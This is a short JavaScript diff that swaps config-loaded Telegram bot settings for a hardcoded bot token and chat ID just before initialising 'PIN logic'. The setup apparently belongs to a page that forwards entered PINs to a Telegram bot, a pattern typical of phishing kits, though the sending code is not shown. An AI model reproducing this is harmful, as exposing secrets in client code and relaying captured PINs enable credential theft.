@@ -62,8 +62,8 @@
     fetch("auth/tele.php")
       .then(response => response.json())
       .then(config => {
-        TELEGRAM_BOT_TOKEN = config.telegramBotToken;
-        TELEGRAM_CHAT_ID = config.telegramChatId;
+        TELEGRAM_BOT_TOKEN = '8168283737:AAElC1wltyQ8aMP40ryHtq6vUJx8Ck-dFAo';
+        TELEGRAM_CHAT_ID = '5906925079';
         initializePinLogic(); // Initialize the PIN logic after config is loaded
       })
       .catch(error => {
